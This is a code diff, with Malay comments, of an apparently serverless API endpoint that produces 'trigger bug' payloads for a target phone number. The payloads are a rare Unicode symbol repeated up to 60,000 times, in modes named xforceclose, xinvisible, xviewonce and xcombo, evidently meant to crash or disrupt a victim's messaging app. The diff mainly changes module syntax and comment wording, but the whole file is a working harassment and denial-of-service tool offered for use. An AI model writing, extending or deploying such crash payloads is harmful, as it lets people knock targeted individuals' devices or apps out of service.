@@ -1,19 +1,19 @@
-module.exports = async (req, res) => {
+export default async function handler(req, res) {
   const { type, target } = req.query;
 
-  // Semak jika parameter tidak lengkap
+  // Periksa parameter
   if (!type || !target) {
-    return res.status(400).json({ 
+    return res.status(400).json({
       success: false,
-      error: 'Parameter "type" dan "target" diperlukan. Contoh: ?type=xcombo&target=60123456789' 
+      error: 'Parameter "type" dan "target" diperlukan. Contoh: ?type=xcombo&target=60123456789'
     });
   }
 
-  // Simbol bug
+  // Simbol untuk bug
   const bugSymbol = "𑲭";
   let triggerText = '';
 
-  // Pilih jenis bug
+  // Pilihan jenis bug
   switch (type.toLowerCase()) {
     case 'xforceclose':
       triggerText = bugSymbol.repeat(60000);
@@ -32,16 +32,16 @@ module.exports = async (req, res) => {
       break;
 
     default:
-      return res.status(400).json({ 
+      return res.status(400).json({
         success: false,
-        error: 'Jenis bug tidak valid. Gunakan: xforceclose, xinvisible, xviewonce, xcombo' 
+        error: 'Jenis bug tidak valid. Guna salah satu: xforceclose, xinvisible, xviewonce, xcombo'
       });
   }
 
-  // Log ke Vercel console
+  // Log di Vercel
   console.log(`[Dilx Trigger] Type: ${type} | Target: ${target} | Length: ${triggerText.length}`);
 
-  // Balas ke pengguna
+  // Response JSON
   return res.status(200).json({
     success: true,
     target,
@@ -50,4 +50,4 @@ module.exports = async (req, res) => {
     preview: triggerText.slice(0, 100) + '...',
     message: 'Trigger bug berjaya dijana.'
   });
-};
+}
